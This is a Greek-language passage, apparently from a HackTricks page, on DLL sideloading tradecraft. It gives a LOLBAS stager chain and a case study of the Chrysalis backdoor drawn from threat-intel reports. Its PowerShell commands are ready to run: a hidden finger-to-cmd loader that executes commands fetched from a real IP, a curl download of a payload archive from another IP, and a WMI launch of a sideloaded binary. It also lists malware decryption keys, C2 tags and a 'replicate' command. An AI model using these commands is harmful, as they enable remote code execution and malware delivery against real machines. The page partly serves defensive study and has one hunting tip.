* Ο decryptor του ShadowPad περιμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Κρατήστε τον φάκελο writable μέχρι να φορτωθεί το payload· μόλις βρεθεί στη μνήμη το TMP αρχείο μπορεί με ασφάλεια να διαγραφεί για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS ώστε το μόνο custom artifact στο δίσκο να είναι η malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Κρυφό PowerShell spawnάρει `cmd.exe /c`, τραβάει εντολές από έναν Finger server, και τις περνάει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` τραβάει κείμενο TCP/79; `| cmd` εκτελεί την απάντηση του server, επιτρέποντας στους operators να αλλάζουν τον second stage server-side.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, αποσυμπιέστε το, και τοποθετήστε το sideload target μαζί με τη DLL κάτω από έναν τυχαίο `%LocalAppData%` φάκελο:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` κρύβει την πρόοδο και ακολουθεί redirects; `tar -xf` χρησιμοποιεί το built-in tar των Windows.

- **WMI/CIM launch:** Εκκινήστε το EXE μέσω WMI ώστε η telemetry να δείχνει μια CIM-created διεργασία ενώ φορτώνει τη colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ., `intelbq.exe`, `nearby_share.exe`); το payload (π.χ., Remcos) τρέχει υπό το trusted name.

- **Hunting:** Ειδοποιήστε για `forfiles` όταν `/p`, `/m`, και `/c` εμφανίζονται μαζί· σπάνιο εκτός admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη εισβολή Lotus Blossom εκμεταλλεύτηκε ένα trusted update chain για να παραδώσει έναν NSIS-packed dropper που staged ένα DLL sideload plus πλήρως in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) δημιουργεί `%AppData%\Bluetooth`, το σημειώνει ως **HIDDEN**, ρίχνει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, μια malicious `log.dll`, και ένα κρυπτογραφημένο blob `BluetoothService`, και μετά εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-loadάρει το blob· το `LogWrite` το αποκρυπτογραφεί με custom LCG-based stream (συντελεστές **0x19660D** / **0x3C6EF35F**, key material παράγεται από έναν προηγούμενο hash), αντικαθιστά το buffer με plaintext shellcode, απελευθερώνει temps, και κάνει jump σε αυτό.
- Για να αποφύγει ένα IAT, ο loader επιλύει APIs με hashing των export names χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, έπειτα εφαρμόζοντας μια Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε πέντε passes, και μετά δυναμικά φορτώνει `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση imports.
- Ανασυνθέτει strings ονομάτων DLL σε runtime μέσω per-character bit-rotate/XOR μετασχηματισμών, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που περπατάει το **PEB → InMemoryOrderModuleList**, κάνει parse κάθε export table σε 4-byte blocks με Murmur-style mixing, και μόνο σε περίπτωση που το hash δεν βρεθεί επιστρέφει στο `GetProcAddress`.

Embedded configuration & C2
- Η config βρίσκεται μέσα στο dropped `BluetoothService` αρχείο στο **offset 0x30808** (μέγεθος **0x980**) και είναι RC4-decrypted με key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons κατασκευάζουν ένα dot-delimited host profile, προσθέτουν το tag `4Q` στην αρχή, και μετά RC4-encrypt με key `vAuig34%^325hGV` πριν το `HttpSendRequestA` πάνω από HTTPS. Οι απαντήσεις RC4-decryptάρονται και διανέμονται από ένα tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode ελέγχεται από CLI args: χωρίς args = εγκαθιστά persistence (service/Run key) που δείχνει σε `-i`; το `-i` επανεκκινεί τον εαυτό του με `-k`; το `-k` παραλείπει την εγκατάσταση και τρέχει το payload.

Alternate loader observed
- Η ίδια εισβολή έριξε Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από `C:\ProgramData\USOShared\`, με `libtcc.dll` δίπλα του. Ο attacker-supplied C source είχε ενσωματωμένο shellcode, το compiled και ran in-memory χωρίς να γράψει PE στο δίσκο. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτή η TCC-based compile-and-run φάση εισήγαγε το `Wininet.dll` κατά το runtime και κατέβασε ένα δεύτερου σταδίου shellcode από μια hardcoded URL, προσφέροντας έναν ευέλικτο loader που παρίστανε εκτέλεση μεταγλωττιστή.

## Αναφορές

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
